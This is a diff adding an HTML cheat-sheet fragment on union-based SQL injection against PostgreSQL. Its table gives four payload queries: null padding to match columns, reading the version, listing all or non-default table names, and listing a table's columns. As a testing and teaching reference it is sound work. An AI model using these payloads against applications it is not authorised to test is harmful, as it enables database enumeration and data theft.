@@ -1,0 +1,30 @@
+<h3 id="union-based-injection">Union-Based Injection</h3>
+
+<p class="pageDescription">{{site.data.injectionDescriptions.unionBased}}</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Union null<br/><i>Note: If original query returns more than one column, add null to equal the number of columns</i></td>
+      <td>SELECT "postgres","test" UNION SELECT version(),null<br></td>
+    </tr> 
+    <tr>
+      <td>Union to retrieve all table names</td>
+      <td>SELECT 'postgres' UNION SELECT table_name FROM information_schema.tables--</td>
+    </tr>
+    <tr>
+      <td>Union to retrieve table names that are not pre-built/default</td>
+      <td>SELECT 'postgres' UNION SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema') AND table_schema NOT LIKE 'pg_toast%' AND table_type = 'BASE TABLE'--</td>
+    </tr>
+    <tr>
+      <td>Union to retrieve columns in a table<br/><i>Note: table name is case-sensitive</i></td>
+      <td>SELECT 'postgres' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME'--</td>
+    </tr>
+  </tbody>
+</table>
